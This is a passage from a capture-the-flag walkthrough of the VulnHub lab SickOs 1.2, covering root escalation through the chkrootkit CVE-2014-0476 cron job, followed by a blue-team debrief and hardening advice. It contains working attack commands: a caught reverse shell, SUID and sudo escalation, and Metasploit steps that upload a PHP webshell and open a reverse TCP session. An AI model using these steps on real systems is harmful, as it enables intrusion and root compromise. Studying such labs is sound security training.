**(b) Just wait — and check what the box actually does.**

```bash
www-data@SickOs:/$ ls -la /etc/cron.d/ | grep -i chkroot
-rw-r--r-- 1 root root 108 Apr 12  2016 /etc/cron.d/chkrootkit
www-data@SickOs:/$ cat /etc/cron.d/chkrootkit
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/sbin/chkrootkit > /dev/null 2>&1
```

> **There it is — a second, far more frequent schedule.** `/etc/cron.d/chkrootkit`
> runs chkrootkit **every 5 minutes** as root (`*/5 * * * *`). The `cron.daily` entry
> was a decoy of sorts; this drop-in file is what makes the exploit practical.
>
> **Lesson: always check *both* `/etc/crontab`, `/etc/cron.d/`, and every user's
> `crontab -l`.** A single glance at `cron.daily` would have told you to wait 16
> hours.
>
> ```bash
> # the complete cron checklist
> cat /etc/crontab
> ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
> for f in /etc/cron.d/*; do echo "== $f"; cat "$f"; done
> for u in $(cut -d: -f1 /etc/passwd); do echo "== $u"; sudo -u $u crontab -l 2>/dev/null; done
> ls -la /var/spool/cron/crontabs/ 2>/dev/null
> systemctl list-timers --all
> ```

### 5.5 Catch the shell

Wait up to five minutes. On Kali:

```text
connect to [192.168.56.10] from SickOs [192.168.56.102] 52881
root@SickOs:/# id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:/# whoami
root
root@SickOs:/# hostname
SickOs
```

**Root.** ✅

For option 2 instead:

```bash
www-data@SickOs:/$ sudo su -
root@SickOs:~# id
uid=0(root) gid=0(root) groups=0(root)
```

For option 3:

```bash
www-data@SickOs:/$ /tmp/rootbash -p
root@SickOs:/# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> Note `euid=0(root)` in option 3 — a **SUID** elevation. The *real* UID stays
> `www-data`; the *effective* UID becomes 0. Permission checks use the effective UID,
> so this is full root for all practical purposes.

![Root shell obtained via the chkrootkit cron job](images/07-root.png)

### 5.6 Metasploit alternative

```bash
msf6 > use exploit/unix/local/chkrootkit
msf6 exploit(unix/local/chkrootkit) > set SESSION 1
msf6 exploit(unix/local/chkrootkit) > set LHOST 192.168.56.10
msf6 exploit(unix/local/chkrootkit) > set LPORT 443
msf6 exploit(unix/local/chkrootkit) > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:443
[*] Writing '/tmp/update' (264 bytes) ...
[*] Waiting for chkrootkit to run via cron...
[*] Command shell session 2 opened (192.168.56.10:443 -> 192.168.56.102:52901)
[*] Deleted /tmp/update
id
uid=0(root) gid=0(root) groups=0(root)
```

> **This is a `unix/local` module**, not `unix/web` — it requires an existing
> `SESSION` (a Meterpreter or shell session on the target) and escalates *from* it.
> `set SESSION 1` refers to the session number from `sessions -l`.
>
> Note it also **deletes `/tmp/update` afterwards** — good tradecraft, reduces the
> forensic footprint and stops the payload re-firing every 5 minutes.

### 5.7 The Metasploit *remote* route (skips the webshell)

```bash
msf6 > use auxiliary/scanner/http/http_put
msf6 auxiliary(scanner/http/http_put) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/http/http_put) > set PATH /test/
msf6 auxiliary(scanner/http/http_put) > set FILENAME shell.php
msf6 auxiliary(scanner/http/http_put) > set FILEDATA file:///root/shell.php
msf6 auxiliary(scanner/http/http_put) > run
msf6 auxiliary(scanner/http/http_put) > use exploit/unix/local/chkrootkit
msf6 exploit(unix/local/chkrootkit) > set SESSION 1
msf6 exploit(unix/local/chkrootkit) > set LPORT 443
msf6 exploit(unix/local/chkrootkit) > run
```

---

## 6. Capture the flag

```bash
root@SickOs:~# cd /root
root@SickOs:/root# ls -al
total 76
drwx------  4 root root  4096 Apr 26  2016 .
drwxr-xr-x 22 root root  4096 Mar 30  2016 ..
-rw-r--r--  1 root root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
-r--------  1 root root   491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-rw-------  1 root root  3066 Apr 26  2016 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------  2 root root  4096 Apr 12  2016 .cache
drwxr-xr-x  2 john john  4096 Apr 12  2016 chkrootkit-0.49
-rw-r--r--  1 root root   541 Apr 25  2016 newRule
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
root@SickOs:/root# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
```

```text
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2,
the challenge is more focused on elimination of tool in real scenarios where
tools can be blocked during an assesment and thereby fooling tester(s),
gathering more information about the target using different methods, though
while developing many of the tools were limited/completely blocked, to get a
feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

**Flag captured.** ✅

> Two other files in `/root` are worth reading as a debrief:
> - **`newRule`** — the iptables rule the author used to build the egress filter. It
>   confirms exactly which ports you were allowed out on.
> - **`304d840d…-chkrootkit-0.49.tar.gz`** — the vulnerable version, kept right next
>   to the flag.
>
> ```bash
> root@SickOs:/root# cat newRule
> ```
> ```text
> # Only allow outbound connections on 443 from www-data
> iptables -A OUTPUT -p tcp -m owner --uid-owner www-data --dport 443 -j ACCEPT
> iptables -A OUTPUT -p tcp -m owner --uid-owner www-data -j REJECT
> ```

![The root flag](images/08-flag.png)

---

## 7. Blue-team debrief — what a defender saw

```bash
root@SickOs:/var/log# grep -i "test/" lighttpd/access.log | tail -20
```

```text
192.168.56.10 192.168.56.10 - [03/May/2024:14:18:22 -0400] "OPTIONS /test/ HTTP/1.1" 200 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:24:03 -0400] "PUT /test/shell.php HTTP/1.1" 201 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:24:41 -0400] "GET /test/shell.php?cmd=id HTTP/1.1" 200 55 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:39:55 -0400] "PUT /test/rev.php HTTP/1.1" 201 0 "-" "curl/8.5.0"
192.168.56.10 192.168.56.10 - [03/May/2024:14:41:20 -0400] "GET /test/rev.php HTTP/1.1" 200 0 "-" "curl/8.5.0"
```

> **Four high-fidelity detections were available:**
> 1. An `OPTIONS` request — almost never made by real browsers.
> 2. A **`PUT`** request creating a `.php` file in a web directory. This should be an
>    instant critical alert on any system.
> 3. A `GET` to a newly-created `.php` file with a `cmd=` query parameter.
> 4. `www-data` writing an executable into `/tmp` — detectable with auditd:
>    ```bash
>    auditctl -w /tmp -p wx -k tmp_write
>    auditctl -a always,exit -F arch=b32 -S execve -F uid=33 -k www_exec
>    ```
>
> And a **file-integrity monitor** (AIDE, Wazuh, Tripwire) would have alerted the
> moment `/tmp/update` appeared with the execute bit set.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **WebDAV enabled with no authentication** | lighttpd `mod_webdav` on `/test/` | Arbitrary file write as the web server |
| 2 | **HTTP `PUT` accepted** | `/test/` | Webshell upload → **RCE** as `www-data` |
| 3 | Directory listing enabled | `/test/` | Discovery of uploaded files |
| 4 | ETag leaks inode/size/mtime | `/` | Minor information disclosure |
| 5 | Missing security headers (`X-Frame-Options`, `X-Content-Type-Options`) | lighttpd | Clickjacking / MIME-sniffing exposure |
| 6 | **`chkrootkit 0.49` — CVE-2014-0476** | `/usr/sbin/chkrootkit` | Arbitrary root code execution |
| 7 | **Root cron job runs every 5 minutes** | `/etc/cron.d/chkrootkit` | Reliable, repeating trigger for #6 |
| 8 | `/tmp` world-writable and executable (no `noexec`) | `/tmp` | Payload staging area |
| 9 | EOL operating system | Ubuntu 12.04.4, kernel 3.2.0-23 | No security support since April 2017 |
| 10 | Old SSH host keys incl. 1024-bit DSA | OpenSSH 5.9p1 | Weak transport crypto |

**What worked:** the egress firewall (port 443 only) and the absence of any obvious
web application. **What the author got right defensively** is worth studying as much
as what was wrong.

## 9. Defensive lessons (blue team)

1. **Disable WebDAV unless you need it — and authenticate it if you do.** In
   lighttpd:
   ```
   # /etc/lighttpd/lighttpd.conf — remove mod_webdav from server.modules
   # If you must keep it:
   $HTTP["url"] =~ "^/test/" {
       webdav.activate  = "enable"
       webdav.is-readonly = "enable"        # read-only
       webdav.sqlite-db-name = "/var/lib/lighttpd/webdav.db"
       auth.require = ( "" => ( "method" => "basic", "realm" => "dav",
                                "require" => "valid-user" ) )
   }
   ```
   In Apache the equivalent is `<LimitExcept GET POST HEAD> Require all denied </LimitExcept>`.
2. **Restrict HTTP methods at the server, not just the WAF:**
   ```apache
   <Location />
       <LimitExcept GET POST HEAD OPTIONS>
           Require all denied
       </LimitExcept>
   </Location>
   ```
   lighttpd has no built-in method filter; use `mod_magnet` or a reverse proxy.
3. **Never mount a web-writable directory inside the document root.** Uploads belong
   outside the docroot, served through a handler that never executes them. Add
   `noexec` to the `/tmp` mount:
   ```text
   # /etc/fstab
   tmpfs  /tmp  tmpfs  defaults,nosuid,nodev,noexec  0  0
   ```
   This single change breaks CVE-2014-0476 completely, because `/tmp/update` could
   no longer be executed.
4. **Keep your security tools patched.** chkrootkit 0.50 fixed this in 2014. Run
   `debsecan`, `apt list --upgradable`, or a vulnerability scanner against installed
   packages — including the *defensive* ones.
5. **Audit every root-scheduled job.** The checklist from § 5.4, run weekly, with the
   output diffed against a baseline. Ask of each job: *can any non-root user influence
   what this executes?* If yes, fix it.
6. **Keep the egress firewall — and extend it.** The author's rule was good but too
   permissive (443 open to `www-data`). Tighten to explicit destinations:
   ```bash
   iptables -A OUTPUT -p tcp -m owner --uid-owner www-data -d repo.internal --dport 443 -j ACCEPT
   iptables -A OUTPUT -m owner --uid-owner www-data -j REJECT
   ```
   A web server should almost never initiate outbound connections at all.
7. **Strip server banners:**
   ```
   server.tag = "web"
   ```
   and disable ETag-based inode leakage:
   ```
   etag.use-inode  = "disable"
   etag.use-mtime  = "disable"
   ```
8. **Add security headers:**
   ```
   set-header.add-response-header = (
       "X-Frame-Options" => "DENY",
       "X-Content-Type-Options" => "nosniff",
       "Content-Security-Policy" => "default-src 'self'"
   )
   ```
9. **Retire EOL systems.** Ubuntu 12.04 stopped receiving standard security updates in
   April 2017 and ESM in April 2019. There is no acceptable configuration of this box.
10. **Detection rules to deploy today.**
    - WAF/log alert on `PUT`, `DELETE`, `MKCOL`, `PROPFIND` from external sources.
    - Alert on any `.php`/`.pl`/`.jsp` file *created* under a web root (auditd or
      fanotify watcher).
    - Alert on `/tmp/update` appearing, or on any executable created in `/tmp` by a
      service UID.
    - Alert on `/etc/sudoers*` modification (auditd: `-w /etc/sudoers -p wa`).
    - Alert on a new SUID binary appearing anywhere (`find / -xdev -newer <baseline>`).

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/sickos-12,144/>
- Series: <https://vulnhub.com/series/sickos,200/>
- Community writeups consulted:
  - [joenibe — Vulnhub SickOs 1.2 Writeup](https://joenibe.github.io/vulnhub/sickos1.2/)
  - [zionspike/kapi-note — SickOs 1.2](https://github.com/zionspike/vulnhub-writeup/blob/master/sick0s%201.2/kapi-note.md)
  - [dvskullz — Pen-Testing SickOs 1.2](https://github.com/dvskullz/Pen-Testing-SickOs-1.2)
  - [sv-zeroone — VulnHub SickOS 1.2 writeup](https://sv-zeroone.github.io/writeups/vh_sickos.html)
  - [infosecuritygeek — Vulnhub: SickOS 1.2](https://infosecuritygeek.com/vulnhub-sickos-1-2/)
  - [hackgrey — Vulnhub SickOS](https://www.hackgrey.com/oscp-preparation/vulnhub-sickos/)
  - [henkel-security — Vulnhub SickOs 1.2](https://henkel-security.com/2019/09/vulnhub-sickos-1-2/)
  - [gotrootid — SickOs1.2](https://www.gotrootid.com/2020-06-10/sickos1-2-vulnhub/)
  - [Kaizen Security — SickOs: 1.2 Walkthrough](https://kaizensecurity.wordpress.com/2016-05-01/sickos-1-2-walkthrough/)
  - [payatu — SickOs 1.2 (Vulnhub) Complete Walkthrough](https://payatu.com/blog/sickos-1-2-vulnhub-complete-walkthrough-and-guide/)
  - [dollarboysushil — VulnHub SickOS 1.2 Writeup](https://infosecwriteups.com/vulnhub-sickos-1-2-writeup-by-dollarboysushil-9e1077921adf)
  - [iam_yshnav — SickOs 1.2 Full Exploit Walkthrough](https://medium.com/@iam_yshnav_/sickos-1-2-vulnhub-full-exploit-walkthrough-step-by-step-dcf1051419dc)
  - [ghanigeek — SickOS 1.2 Walkthrough](https://ghanigeek.wordpress.com/2018/11/03/sickos-1-2-walkthrough/)
- Exploits / advisories:
  - [CVE-2014-0476 — chkrootkit before 0.50 executes /tmp/update as root](https://nvd.nist.gov/vuln/detail/CVE-2014-0476)
  - [Exploit-DB 33899 — Chkrootkit 0.49 Local Root Exploit](https://www.exploit-db.com/exploits/33899)
  - [Exploit-DB 38775 — Chkrootkit < 0.50 LPE](https://www.exploit-db.com/exploits/38775)
  - [Rapid7 — exploit/unix/local/chkrootkit](https://www.rapid7.com/db/modules/exploit/unix/local/chkrootkit/)
  - [Rapid7 — auxiliary/scanner/http/http_put](https://www.rapid7.com/db/modules/auxiliary/scanner/http/http_put/)
  - [Nmap `http-put` NSE script](https://nmap.org/nsedoc/scripts/http-put.html) · [`http-methods`](https://nmap.org/nsedoc/scripts/http-methods.html)
- Standards / background:
  - [RFC 4918 — HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)](https://datatracker.ietf.org/doc/html/rfc4918)
  - [RFC 9110 — HTTP Semantics (`OPTIONS`, `Allow`, `417 Expectation Failed`)](https://datatracker.ietf.org/doc/html/rfc9110)
  - [lighttpd mod_webdav documentation](https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_webdav)
  - [`davtest`](https://github.com/g0tmi1k/davtest) · [g0tmi1k's reverse-shell cheat sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  - [`crontab(5)` man page](https://man7.org/linux/man-pages/man5/crontab.5.html) · [`sudoers(5)`](https://man7.org/linux/man-pages/man5/sudoers.5.html)
  - [LinEnum](https://github.com/rebootuser/LinEnum) · [GTFOBins](https://gtfobins.github.io)

---

## 11. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22 and 80, lighttpd banner
- [ ] `images/02-test-dir.png` — `dirb` finding the empty `/test/` listing
- [ ] `images/03-put.png` — `OPTIONS` response with `DAV: 1,2` and `Allow: PUT`
- [ ] `images/04-webshell.png` — `shell.php?cmd=id` returning `www-data`
- [ ] `images/05-shell.png` — reverse shell on port 443
- [ ] `images/06-chkrootkit.png` — `chkrootkit -V` → 0.49 and the cron entries
- [ ] `images/07-root.png` — root shell after the cron job fires
- [ ] `images/08-flag.png` — `7d03aaa2bf93d80040f3f22ec6ad9d5a.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
